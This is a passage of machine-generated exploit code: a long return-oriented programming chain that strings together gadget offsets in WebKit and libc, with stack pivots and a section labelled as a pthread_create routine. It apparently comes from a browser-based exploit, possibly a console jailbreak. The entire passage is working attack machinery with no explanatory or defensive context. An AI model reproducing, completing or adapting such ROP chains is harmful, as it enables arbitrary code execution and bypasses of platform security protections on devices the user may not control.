ropchain+146040, //L2053
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146008, //L2050
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145992, //L2052
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2052:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2050:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2051:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2053:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146144, //L2055
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146128, //L2054
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2054:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2055:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2056:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2057:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+146344, //L2060
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146312, //L2059
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2059:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2058:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146448, //L2062
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146432, //L2061
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2061:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2062:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146560, //L2065
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146528, //L2064
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2064:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2063:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146624, //L2066
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L2066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+146680, //L2068
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2068:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+146824, //L2070
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+146840, //L2072
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+146808, //L2071
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2071:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2070:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2072:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+147000, //L2076
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146968, //L2073
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146952, //L2075
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2075:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2073:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2074:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2076:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+147128, //L2078
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147144, //L2079
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+147112, //L2077
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2077:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2078:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147240, //L2080
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147256, //L2081
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2080:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2081:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147368, //L2082
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147352, //L2083
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2083:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2082:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+147456, //L2085
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+147440, //L2084
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2084:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147552, //L2086
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147568, //L2087
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2086:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147680, //L2088
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147664, //L2089
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2089:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2088:
db([0, 0]); // 0x0
//_pthread_create__rop:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147752, //L2090
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2090:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147816, //L2092
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2092:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147920, //L2096
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147968, //L2097
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2096:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2094:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2095:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2097:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+148064, //L2099
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+148048, //L2098
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2098:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2099:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2100:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2101:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2102:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2103:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2105:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+148376, //L2106
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2106:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2108:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2110:
db([2, 0]); // 0x2
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+148568, //L2111
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2111:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+148680, //L2115
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2115:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2113:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L2114:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+148808, //L2117
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+148792, //L2116
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2116:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2118:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2120:
ropchain+148960, //L2119
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+157624, //L2121
//L2119:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+149056, //L2123
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2123:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+149112, //L2124
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2124:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2126:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L2127:
db([65536, 0]); // 0x10000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+149264, //L2129
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2129:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+149320, //L2130
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2130:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+149392, //L2132
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2132:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2133:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2136:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L2137:
db([312, 0]); // 0x138
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2138:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+149592, //L2140
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+149608, //L2141
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2140:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+149760, //L2143
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+149792, //L2146
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+149776, //L2144
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+149744, //L2145
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2145:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2143:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2144:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2146:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+149888, //L2148
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+149872, //L2147
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2147:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2148:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2149:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2150:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+150104, //L2151
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150120, //L2153
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150088, //L2152
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2152:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2151:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2153:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150224, //L2155
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+150208, //L2154
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L2154:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2155:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2156:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2158:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+150368, //L2160
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150384, //L2161
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2160:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2161:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+150536, //L2163
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150568, //L2166
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150552, //L2164
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+150520, //L2165
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2165:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2163:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2164:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2166:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150664, //L2168
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+150648, //L2167
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2167:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2168:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2170:
db([15, 0]); // 0xf
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+150776, //L2171
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2171:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+150920, //L2173
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150936, //L2175
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150904, //L2174
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2174:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2173:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2175:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151040, //L2177
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151024, //L2176
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L2176:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2177:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2178:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2180:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+151184, //L2182
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151200, //L2183
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2182:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2183:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+151352, //L2185
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+151384, //L2188
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151368, //L2186
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+151336, //L2187
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2187:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2185:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2186:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2188:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151480, //L2190
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151464, //L2189
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2189:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2190:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2191:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2192:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+151696, //L2193
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+151712, //L2195
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151680, //L2194
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2194:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2193:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2195:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151816, //L2197
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151800, //L2196
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+206806 //pop rdi
]);
//L2196:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2197:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2198:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2200:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2201:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+151976, //L2203
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151992, //L2204
